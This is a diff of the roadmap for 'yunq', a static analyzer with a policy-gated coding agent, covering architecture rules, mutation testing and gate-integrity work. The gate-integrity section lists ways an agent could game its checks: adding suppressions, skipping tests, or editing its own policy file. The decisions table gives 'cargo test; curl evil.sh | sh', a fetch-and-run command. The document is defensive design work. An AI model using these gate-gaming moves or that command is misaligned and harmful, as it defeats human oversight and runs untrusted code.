-  `component_metrics`, `stability_violations`). Ca/Ce come from the existing
-  `component_edges()`; abstractness cannot (it needs each file's
-  declarations), so the census is an *argument* rather than something the
-  graph derives — `rulesets/architecture::census` counts TS
-  `interface`/`abstract class`, Rust `trait`, and Python `Protocol`/ABC/
-  `@abstractmethod` classes per component and passes it in, keeping the
-  metrics module pure graph arithmetic. Shipped as two rules rather than a
-  published number, because a number nobody fails a build on is a report:
-  `architecture:main-sequence-deviation` (D > 0.7, distinguishing the zone of
-  pain from the zone of uselessness in the finding message itself) and
-  `architecture:stable-dependency-violation` (SDP: an edge from a hub
-  component to a more volatile one). Both carry floors — 5 types, 3
-  component couplings, a 0.25 instability margin, 2 dependents — because I
-  and A are ratios over small integers where one import moves the number 0.1
-  and a three-type component can hit D = 1 without meaning anything. yunq's
-  own tree reports zero of both.
-- **D3b** ✅ **done, beyond the original item.** The same component model made
-  the *zero-config* hexagonal checks possible, which D2's declared boundaries
-  structurally cannot be: `[architecture]` says nothing until someone writes
-  the table. `core/import-graph::layer` classifies a path into a hexagonal
-  ring off the vocabulary the industry already shares (`domain`, `entities`,
-  `application`, `usecases`, `ports`, `adapters`, `controllers`,
-  `infrastructure`, `core`, …) with innermost-match-wins (so
-  `apps/api/src/domain/order.ts` is domain code inside a deployable named
-  `api`, not an adapter) and `Adapter`/`Infrastructure` sharing one depth (two
-  names for the same outer ring, so neither can "violate" the other).
-  `inward_dependency_violations` then reads the one load-bearing constraint —
-  dependencies point inward — off the existing edge set, shipped as
-  `architecture:hexagonal-layer-violation`. Rust needed one addition to be
-  covered at all: `extract_rust_edges` deliberately skips
-  `crate`/`self`/`super` (always intra-crate), which is exactly where a
-  single-crate `src/domain` / `src/infrastructure` hexagon lives, so
-  `resolve::resolve_rust_module` resolves those paths to files (longest module
-  prefix first, dropping the item tail) behind an opt-in
-  `ImportGraph::build_with_rust_modules` — opt-in because folding intra-crate
-  module edges into the default graph would turn `DependencyCycleRule` into a
-  firehose (a parent module naming its children while they reach back with
-  `super::` is idiomatic Rust, not a cycle smell).
-  `architecture:framework-in-domain` covers what no graph rule can — a domain
-  file importing `sqlalchemy`/`typeorm`/`reqwest` produces no *edge*, because
-  the dependency isn't in the analyzed set at all.
-- **D3c** ✅ **done.** Tactical DDD as a ruleset (`rulesets/ddd`):
-  `anemic-domain-model`, `public-entity-setter`,
-  `aggregate-exposes-internal-collection`, `primitive-obsession`,
-  `persistence-in-domain`. Every rule is scoped to the domain layer via
-  `layer_of`, and that scope is the finding: the same shapes are *correct* at
-  the edges (a DTO should be anemic and full of setters, a row type should
-  carry the ORM mapping), so a rule that fired everywhere would be reporting
-  taste instead of a defect. Accessors are recognized structurally — a
-  single-statement body that only hands a field out or takes one in — not by
-  name, because the three languages disagree on naming (`getTotal`, `total()`,
-  `@property def total`) and agree on shape; a setter that validates anything
-  is not a setter. Rust is read on its own terms too: an exposed collection is
-  only a finding for `&mut self.items`, since a shared borrow cannot mutate
-  what it borrows.
-  **Go joined all of it** (D3d): `core/symbols` grew a Go extractor (struct and
-  interface `type_spec`s, receiver methods matched to their type, `New<Type>`
-  constructor functions) and `MethodInfo` grew a `receiver`, so accessor
-  detection works on `func (o *Order)` bodies without special-casing anything at
-  the rule level; `core/import-graph` resolves Go `import` paths by shared
-  directory tail (the module prefix lives in `go.mod`, which an I/O-free crate
-  cannot read, and a scan rooted below `go.mod` would not reproduce it anyway);
-  the rosters grew Go entries (`database/sql`, `gorm.io/gorm`, gin/echo/fiber,
-  gorm struct tags). Mojo did **not**: there is no `tree-sitter-mojo` on
-  crates.io, this workspace publishes to crates.io, and Mojo's `struct`/`fn`
-  syntax is not parseable by the Python grammar — the honest status is unsupported
-  until a published grammar exists, at which point it is a parser crate plus one
-  `EXTRACTORS` row.
-
-  **The god-component objection, answered in code** (D3e): `core/symbols/
-  classes.rs` had grown to 804 lines with a per-language `match` at its centre —
-  the same shape `smells:type-check-chain` and `smells:god-class` were shipped to
-  flag. It is now `classes/{mod,typescript,python,rust,go}.rs` behind an
-  `EXTRACTORS` table of `(declaration kind, build, attach)` rows, so the registry
-  never asks what language it is looking at and a new language is a new file plus
-  a row. Parameter extraction collapsed from four near-identical per-language
-  functions into one `function_params`, and per-language visibility moved from a
-  `bool` flag threaded through call sites into a `VISIBILITY` policy table.
-
-  Building it exposed two real bugs in `core/symbols` that had been silently
-  degrading every existing OOP-smell rule on Rust: `attach_rust_impls` took
-  the *first child* as a method name, so every `pub fn` was dropped (a
-  `visibility_modifier` comes first), and `declared_type`'s type-node test
-  (`kind.contains("_type")`) missed a bare `type_identifier`, so a field or
-  parameter annotated with a project's own type read as untyped while `i32`
-  resolved fine. Python decorated methods (`@property`, `@staticmethod`) were
-  invisible for the same class of reason. All three fixed, with tests.
-- **D4 — `yunq arch`.** Layered interactive view: components as boxes ranked
-  by topological layer, cycles in red, drill-down, hover for the specific
-  import paths. arch-view exports EDN for headless use; yunq exports JSON,
-  and renders as a self-contained HTML file rather than a desktop window —
-  it must work over SSH and attach to a PR comment.
-
-## E. Gate integrity — mutation testing and anti-gaming
-
-Two halves of one question: **is this gate load-bearing, or does it only look
-like it?** Mutation testing asks whether the suite would notice a regression.
-Anti-gaming asks whether the gate is still there at all. An agent optimising
-for a gate has two strategies available — satisfy it, or remove it — and
-right now the second is both cheaper and invisible.
-
-### Mutation testing, widened
-
-The CI mutation gate exists and works — it caught a real regression in
-`yunq-agent-policy` (`Evaluation::is_empty` and `AgentPolicy::enabled` had
-only true-case assertions, so the "replace body with `true`" mutant survived
-both). It is scoped to exactly one crate.
-
-Coverage says a line ran. Mutation says a test would have *noticed*. With A
-and B shipping code written by yunq's own agent, that distinction stops being
-academic: a coverage gate is trivially satisfiable with assertion-free tests.
-The standard worth stating plainly is that **the suite must be able to catch
-a revert of the change** — a test that passes whether or not the change is
-there asserts nothing. Every mature agent workflow states that as a rule in a
-prompt and hopes. A surviving mutant is the mechanical proof, which is the
-only version of the rule that survives contact with a system optimising
-against it.
-
-- **E1** 🚧 **in progress.** Widen crate by crate, cheapest first, admitting
-  each only once it proves fast enough to stay in CI: `profiles` →
-  `import-graph` → `duplication` → `taint` → `rules-engine`. `profiles`
-  admitted: `dogfood-mutation` (`.github/workflows/ci.yml`) is now a
-  `strategy.matrix` over `[yunq-agent-policy, yunq-profiles]` rather than a
-  single hardcoded crate, so widening further is an added matrix entry, not
-  new job plumbing — `cargo mutants -p yunq-profiles` runs 170 mutants in
-  ~90s (measured in-sandbox), well inside budget, and clears the default
-  gate's 60% mutation-score bar at ~72% (92 killed / 128 viable). The 36
-  survivors are concentrated in `Display`/`as_str`/`symbol` accessors and
-  `Severity::parse`'s match arms — real, if low-severity, assertion gaps
-  worth closing in a follow-up rather than blocking this crate's admission,
-  since the roadmap's own bar is "clears the gate", not 100%. Also fixed in
-  passing: every `--enforce-gate` invocation in this workflow (`dogfood-gate`,
-  `dogfood-coverage`, and this job) called `./target/debug/yunq-cli`, a
-  binary that has never existed — the crate is `yunq-cli` but its `[[bin]]`
-  is deliberately named `yunq` (so `hook install`'s generated commands
-  resolve on PATH). Confirmed via the live run history
-  (`gh`/GitHub Actions API) that this has been failing on every push to
-  `main` since the mutation-gate job was introduced, silently, because nothing
-  was watching CI. Fixed to `./target/debug/yunq` throughout. `import-graph`
-  admitted next: `dogfood-mutation`'s matrix grows to
-  `[yunq-agent-policy, yunq-profiles, yunq-import-graph]`, still zero new job
-  plumbing. `cargo mutants -p yunq-import-graph` runs 130 mutants in ~2min
-  (measured in-sandbox), clears the 60% bar at **92%** (115 killed / 125
-  viable, 5 unviable) — comfortably the strongest score of the three admitted
-  so far, unsurprising for a crate that's pure graph algorithms with no I/O.
-  Verified end-to-end locally, not just estimated: ran the same
-  `cargo-mutants` → Stryker-shape `jq` conversion → `yunq scan
-  --mutation-report --enforce-gate` pipeline the CI job runs, and it exits 0.
-  The 10 survivors are real, low-severity gaps — an `||`/`&&` swap in
-  `strip_quotes`, an `!=`/`==` swap in `extract_py_edges`, a deleted
-  `"crate" | "self" | "super"` match arm in `rust_path_root`, and
-  `ArchitectureConfig::is_empty` surviving a forced `false` because the one
-  test that exercises it (`ArchitectureConfig::default().violations(...)
-  .is_empty()`) passes either way when both dependency lists are already
-  empty — left as follow-up under this same item rather than blocking
-  admission, same precedent as `profiles`' survivors. `yunq-cpd` admitted
-  next: matrix grows to `[..., yunq-import-graph, yunq-cpd]`. `cargo mutants
-  -p yunq-cpd` runs 147 mutants in ~2m20s (measured in-sandbox, including a
-  4s baseline build), clears the 60% bar at **84%** (115 killed + 2 timeout
-  = 117 detected / 139 viable, 8 unviable). The 22 survivors cluster in three
-  places: arithmetic-operator swaps (`+`/`*`, `-`/`+`, `-`/`/`) inside window
-  and hash-chunking math (`collapse_repeats`, `chunk_blocks`,
-  `group_matches_by_delta`, `find_duplicates`) where no test asserts on the
-  exact numeric output of the internal indexing, only on which duplicate
-  spans get reported; a `>`/`==`/`<`/`>=` boundary swap at
-  `collapse_repeats`'s repeat-count comparison; and
-  `CloneRegion::overlaps`'s body replaceable with a bare `false` plus both
-  its `<=` comparisons flippable to `>`, meaning nothing currently exercises
-  the overlap-merging path directly. Verified end-to-end locally with the
-  same `cargo-mutants` → `jq` → `yunq scan --mutation-report --enforce-gate`
-  pipeline, exit 0. Left as follow-up under this same item, same precedent
-  as the other two crates' survivors — `CloneRegion::overlaps` is the one
-  worth prioritizing first, since an unmerged/wrongly-merged clone region is
-  a correctness bug in the reported findings themselves, not just an
-  internal accounting detail.
-- **E2** Mutation score as a first-class gate metric (the default gate
-  already reserves it) and a mandatory condition on any crate `yunq agent`
-  writes to.
-- **E3** Evaluate `clj-mutate`/`mutate4go`-style scoping so a PR mutates only
-  what it touched. Full-workspace mutation will not fit in a PR's time
-  budget; diff-scoped mutation might.
-
-### Gate-gaming detection
-
-The forbidden shortcut is not writing bad code — it is quietly lowering the
-bar and then clearing it. Concretely: adding a coverage exclusion, adding a
-suppression (`#[allow]`, `// nolint`, `# noqa`, `eslint-disable`,
-`# type: ignore`), marking a test `#[ignore]`/`skip`, deleting a failing
-test, weakening an assertion, or lowering a threshold in the project's own
-config. Each is legitimate when a human does it deliberately and reviewably;
-each is a silent gate bypass when it appears inside a change whose purpose
-was to pass that gate.
-
-The sharpest case is the self-referential one: an agent denied by
-`yunq-policy.toml` editing `yunq-policy.toml` to move the offending rule into
-`advisory_rules`. That is not a hypothetical — it is the single
-highest-leverage move available to anything optimising for "the write lands".
-A referee whose rulebook the players can edit is not a referee.
-
-- **E4** ✅ **done.** `ai:suppression-added` and `ai:test-skipped` in
-  `bin/cli/src/hook.rs` (`suppression_added_findings`/`test_skip_added_findings`),
-  following the diff-against-on-disk shape `new_dependency_findings` set for
-  the supply-chain guard — a suppression/skip already on a line before this
-  write is not a finding, the same line introduced by it is. Covers
-  `#[allow(...)]`, `eslint-disable`, `# noqa`, `# type: ignore`,
-  `# pylint: disable`, `//nolint`, `# pragma: no cover`, `// istanbul ignore`
-  (suppressions and coverage exclusions, one rule) and `#[ignore]`,
-  `@pytest.mark.skip`, `@unittest.skip`, `.skip(`, `xit(`, `xdescribe(`
-  (skipped tests, the other). Both `Severity::Major`, neither in the default
-  policy's `blocking_rules` — opt-in via `advisory_rules`/`blocking_rules`,
-  documented in `hook_install.rs`'s `POLICY_TEMPLATE`. Not attempted here:
-  deleting a failing test outright and weakening an existing assertion — both
-  need identifying *which* test/assertion changed meaning, not just spotting a
-  new marker substring, and are open follow-ups under this same item.
-- **E5** ✅ **done.** `hook install`'s `POLICY_TEMPLATE`
-  (`bin/cli/src/hook_install.rs`) lists `yunq-policy.toml` (the rulebook
-  itself) and `yunq.toml` (gate thresholds/exclusions) as `[[protected_path]]`
-  entries alongside the pre-existing `.github/workflows/**`, so an agent
-  denied by its own policy cannot resolve the denial by editing the policy.
-
-**Bug found by dogfooding, not on this list, fixed alongside it:**
-`bin/cli/src/hook.rs::analyze_content` mapped only `report.issues()` into
-policy findings, never `report.hotspots()`. `owasp:command-execution` is
-`FindingKind::Hotspot` by design (`rulesets/owasp/src/command_exec.rs`) and
-is one of six rules in `AgentPolicy::default()`'s own built-in
-`blocking_rules` — meaning the zero-config guardrail's flagship README
-example ("an agent that tries to write a shell-injection sink gets its own
-tool call denied") was not actually true out of the box; hotspot-classified
-rules could never deny a write regardless of policy. Found by installing
-`hook install` on this repository and hand-verifying `yunq hook claude-code`
-against a real `os.system(user_input)` payload, which returned silent
-`exit 0` where it should have denied. Fixed by folding `report.hotspots()`
-into the same mapping, borrowing each hotspot's severity from the active
-quality profile (`Hotspot` itself carries none — that is what distinguishes
-it from an `Issue`) since `block_at_or_above` still needs one to compare
-against, while `blocking_rules`/`escalate_rules` match by rule id regardless.
-Regression-tested (`a_hotspot_rule_is_included_in_analyze_content_findings`,
-`the_built_in_default_policy_actually_denies_a_hotspot_blocking_rule`).
-
-**Design constraint, and why this is not just another rule:** every one of
-these findings needs a *before* state, and the `Rule` trait deliberately sees
-only one file's current content — a suppression that was always there is not
-a finding, and the same line added in this change is. So these follow the
-precedent `hook.rs::new_dependency_findings` already set for the supply-chain
-guard: diff against the on-disk version at `PreToolUse` time and emit an
-ordinary `Finding` that flows through `AgentPolicy::evaluate` like any other.
-Same shape, second instance — which is a good sign the shape is right, and a
-signal it may deserve to be a named abstraction rather than a third
-hand-rolled copy.
-
-## F. Performance debt (carried forward, unchanged in priority)
-
-Target remains **≥100k LOC/s per core**; measured floor ~67.6k. The two
-open items, in the order most likely to close the gap:
-
-- **Cross-file phase caching.** The per-file analysis cache exists; the
+**Performance** — target ≥100k LOC/s per core, measured floor ~67.6k:
+- Cross-file phase caching. The per-file analysis cache exists; the
   cross-file phase re-parses every file every run with no cache and no
   dependency-aware invalidation.
-- **mmap for large files.** Lower value — needs unsafe to avoid re-copying
-  into the existing `Arc<str>` buffer, and only pays on unusually large
-  files.
+- mmap for large files. Lower value — needs `unsafe` to avoid re-copying
+  into the existing `Arc<str>` buffer, and only pays on unusually large files.
+- (Arena-allocated AST was tried and dropped — see DEVLOG. Raw parse latency
+  improved but full-pipeline scan time did not; not worth the diff.)
 
-CI gates on a 10% regression against the PR's own merge base, measured on the
-same runner, so the gate never compares across hardware generations. Peak RSS
-and p50/p99 per-file latency are reported but not yet gated — no established
-target.
+**C4 — Run coverage, don't only ingest it.** CRAP currently needs a coverage
+report piped in. Detect the project's coverage command from its build files
+(`Cargo.toml` → `cargo llvm-cov`, `go.mod` → `go test -coverprofile`,
+`pom.xml` → JaCoCo, `pyproject.toml` → coverage.py, `package.json` → the
+runner's own flag). Config wins over detection; a detected command is
+*offered* for persistence in `yunq.toml`, never silently re-run.
+**Opt-in only** (`--run-coverage` or explicit config) — a static analyzer
+executing build commands on a bare `yunq scan` is a footgun.
 
-## G. Platform threads still open
+**E1–E3 — Mutation testing, further widening.** `profiles`, `import-graph`,
+and `duplication` are admitted to the CI mutation gate (`dogfood-mutation`
+matrix), each clearing the 60% score bar. Remaining: `taint` → `rules-engine`
+→ `core/agent` (the highest-consequence decision logic added since
+`core/agent-policy` itself). Also open: mutation score as a mandatory gate
+on any crate `yunq agent` writes to (E2), and diff-scoped mutation so a PR
+mutates only what it touched, since full-workspace mutation won't fit a PR's
+time budget (E3).
 
+**D4 — `yunq arch` viewer.** Layered interactive view: components as boxes
+ranked by topological layer, cycles in red, drill-down, hover for the
+specific import paths. Renders as a self-contained HTML file (must work over
+SSH and attach to a PR comment), not a desktop window.
+
+**Platform threads:**
 - **Cross-file at write time.** `yunq hook`'s verdict is single-file, so
-  cross-file taint and the cross-file architecture rules never participate in
-  a pre-write decision. D2's import-graph checks are the first cross-file
-  signal cheap enough to run there.
+  cross-file taint and the cross-file architecture rules never participate
+  in a pre-write decision.
 - **Provenance beyond the local ledger.** `.yunq-provenance.json` is
   per-path, local, gitignored, and does not reach the project-level quality
   gate.
-- **Gherkin evidence is a claim, not a proof.** A `@covers` tag asserts that
-  a scenario covers a path; nothing verifies the scenario runs or passes.
-  Correlating execution with source paths (step-definition file/line metadata
-  from a cucumber JSON report) is unstarted. The portable-pipeline shape in
-  [Acceptance-Pipeline-Specification](https://github.com/unclebob/Acceptance-Pipeline-Specification)
-  — Gherkin → JSON IR → generated entry points → runner — is the reference
-  design if this is ever taken further.
-- **Codex CLI.** Its tool hooks fire on shell commands only, not file writes,
-  so no edit-time guardrail can be installed there. `yunq hook check` remains
-  the portable path.
-- **MCP.** Still no server, still deliberately. An MCP tool is *consulted*,
-  and a model optimising for task completion learns not to consult something
-  that might refuse it; a host hook is *invoked* and cannot be routed around.
-  The one defensible use is planning-time and read-only —
-  `yunq://policy/current` and `yunq://architecture/blueprint` ingested once
-  before an agent plans an edit, so it starts from "this repo blocks `eval`"
-  instead of discovering it by denial. Context, never enforcement.
-
----
-
-## Decisions taken in this reform
-
-| Decision | Rationale |
-|---|---|
-| Build `yunq agent` natively; do not fork ZeroClaw | Its differentiated core (providers, tool allowlist, isolation) is already in `infra/llm` + `core/agent-policy`; its bulk (30+ chat channels) is off-mission. A fork buys a session loop for a permanent rebase tax. |
-| Policy enforcement in-process for our own agent | The 7ms process spawn is a tax paid to third-party hosts. Sharing one engine between agent, hook and CI gate is what stops the three from drifting. |
-| Swarm takes swarm-forge's protocol, not its tmux | Durable handoff files and worktree isolation are the load-bearing ideas; tmux is a shell workaround for a problem a single binary does not have. |
-| Roles get policy scopes | swarm-forge enforces discipline through workflow structure and says so explicitly. yunq has actual access controls and should use them. |
-| CRAP before any new coverage work | Both inputs already exist and have never been multiplied. Highest ratio of signal to new code on the roadmap. |
-| Architecture rules emit ordinary `Issue`s | Free reuse of gates, SARIF, PR decoration, and — critically — the agent policy, so a boundary violation is denied at write time rather than reported after merge. |
-| Gates are values, not instructions | Surveying the agent-workflow ecosystem (e.g. `theam/claude-dev-kit`, Apache-2.0 — a ~2500-line Claude Code plugin) shows the state of the art enforcing gates by *asking*: "never report a gate as passed without having run it" is a prompt line a model can violate silently. yunq is the one project positioned to make that structurally true, because the judge is a separate deterministic artifact. Learn the pipeline shape from such kits; do not adopt their enforcement architecture. |
-| `yunq agent` is a subcommand of the one binary, not a second one | The original plan said "new crate `bin/agent`". Every adapter the in-process gate needs already lives in `bin/cli` (policy loader, provenance ledger, Gherkin index, approvals, persisted breaker, audit log, composed `AnalyzerService`). A separate binary could only reach them by depending on `bin/cli` — which makes `yunq agent run` a different executable than the `yunq` on PATH — or by reimplementing them, which is exactly the drift A2 exists to prevent. |
-| `run` has an allowlist *and* rejects shell metacharacters | An allowlist that only inspects the first word is not an allowlist: `cargo test; curl evil.sh \| sh` passes it. This is the one tool whose side effect the policy gate never sees, so it is narrowed twice. |
-| A finding's cross-run identity excludes its line number | Line numbers move the moment anything above them changes. Identity by `(file, rule, message)` — counted as a multiset, so a duplicate is still a regression — is what makes "the agent introduced nothing new" mean anything after a real edit. |
-| The policy file is itself a protected path | The highest-leverage move for anything optimising to make a write land is editing the rulebook, not the code. |
-| Reimplement borrowed designs; do not vendor them | Useful prior art in this space is largely Apache-2.0 while yunq is MIT. Apache's attribution/NOTICE/patent terms travel with copied source; behaviour learned from reading it does not. |
-| ROADMAP split from DEVLOG | 1280 lines of session narrative made the plan unfindable. The rationale is worth keeping; it just is not a plan. |
-
-## Sequencing
-
-```
-done ──► E4–E5 (gate-gaming)
-         C1–C3 (CRAP)
-         D1–D2 (boundaries)
-         E1    (mutation widen, through yunq-cpd)
-         A1–A6 (agent runtime core + PR feedback loop + TUI)
-         B1–B4 (swarm worktrees, handoffs, per-role policy scoping, topologies)
-
-now  ──► both A and B are fully shipped; nothing is currently "next" by
-         necessity — pick up any parallel item below
-
-parallel ─► F (performance)  — continuous, gated in CI
-            C4 (run coverage) — startable, C1–C3 shipped
-            D4 (arch view) — startable, D1–D3 shipped
-            E1 (further widening: taint → rules-engine) — more matrix entries
-            G — opportunistic
-```
-
-E4–E5 shipped first, ahead of everything else in their group, because they
-are the precondition for the rest: every gate A and B are measured against is
-only worth building if the agent cannot quietly edit it. C1–C3 (CRAP) shipped
-next — cheapest high-value item, both inputs already existed. D1–D2
-(boundaries) shipped next — components fall out of the same directory
-topology the workspace already enforces via Cargo, and a violation reuses
-every pipeline CRAP's findings already flow through, so the whole feature
-added one config table and one cross-file rule.
-
-A1–A5 shipped next, in one pass rather than four, because A2 is the reason
-the workstream exists and the other three are only interesting once it holds:
-a session loop without the gate is a worse version of every agent already on
-the market. A5 came along with them because "done" is not a claim you can
-make about a pull request the instant you push it.
-
-A6 (TUI) and B1–B3 (swarm worktrees, durable handoffs, per-role policy
-scoping) shipped together in the same pass, because once `core/agent` grew
-an `Observer` port for A6, the natural next step was giving something
-concrete to watch other than a solo session — B1–B3 are what a swarm role
-needs before it can run at all (its own worktree, its own handoff channel,
-its own scoped policy). B4 shipped next, closing workstream B entirely:
-`yunq agent run --task` was already headless, scriptable and returned a
-structured outcome, and B1–B3 already had isolated worktrees, scoped
-policies and a durable handoff queue per role — `core/swarm::topology` plus
-`bin/cli::swarm::topology_run` is what drives several of them through a
-`yunq.toml`-declared shape automatically instead of one role at a time by
-hand. F is continuous and already gated. D4 (I/A metrics, `yunq arch`
-viewer) can start now that D1's component model exists. E1's remaining
-widening (taint → rules-engine) is more matrix entries, and `core/agent` is
-the obvious next admission to it: it is pure, fast, and the
-highest-consequence decision logic added since `core/agent-policy` itself.
+- **Gherkin evidence is a claim, not a proof.** A `@covers` tag asserts a
+  scenario covers a path; nothing verifies the scenario runs or passes.
+- **Codex CLI.** Its tool hooks fire on shell commands only, not file
+  writes, so no edit-time guardrail can be installed there.
+- **MCP.** Still no server, still deliberately — a host hook is *invoked*
+  and cannot be routed around, while an MCP tool is only *consulted*. The
+  one defensible use is planning-time, read-only context.
 
 ## Non-goals
 
 - A general-purpose assistant runtime. No chat channels, no personal-assistant
   surface, no plugin marketplace. yunq edits repositories under a policy.
-- An MCP server for enforcement (see G).
-- An edition wall. Everything in this roadmap ships in the open repo; the
-  hosted layer in `yunq-cloud` is convenience, never a gatekeeper.
+- An MCP server for enforcement.
+- An edition wall. Everything here ships in the open repo; the hosted layer
+  in `yunq-cloud` is convenience, never a gatekeeper.
 - Self-assessment. No turn in which the model grades its own edit. The
   analyzer is the judge, or there is no verdict.
